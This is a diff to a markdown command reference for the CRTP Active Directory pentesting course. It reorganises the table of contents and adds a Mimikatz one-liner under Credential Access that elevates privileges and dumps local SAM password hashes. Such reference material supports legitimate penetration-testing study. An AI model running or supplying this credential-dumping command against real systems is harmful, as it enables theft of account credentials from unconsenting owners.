@@ -17,10 +17,10 @@ Command/tooling reference material useful for the CRTP course and Active Directo
     - [AD PowerShell Module](#Active-Directory-PowerShell-Module)
    - [Local Privilege Escalation](#Local-Privilege-Escalation) 
    - [Credential Access](#Credential-Access)
+     - [Mimikatz](#Mimikatz)
    - [Lateral Movement](#Lateral-Movement)
-    - [Other Tooling](#Tooling)
+   - [Other Tooling](#Tooling)
       - [Bloodhound](#Bloodhound)
-      - [Mimikatz](#Mimikatz)
     - [Links](#Links)
       - [User Hunting](#User_Hunting)
 
@@ -179,8 +179,10 @@ winPEASx64.exe
 ```
 ## Credential Access 
 I would recommend becoming familiar with different tooling that can be used to dump creds. 
-
-
+### Mimikatz 
+```powershell
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
+```
 ## Lateral Movement
 All the PS remoting 
 
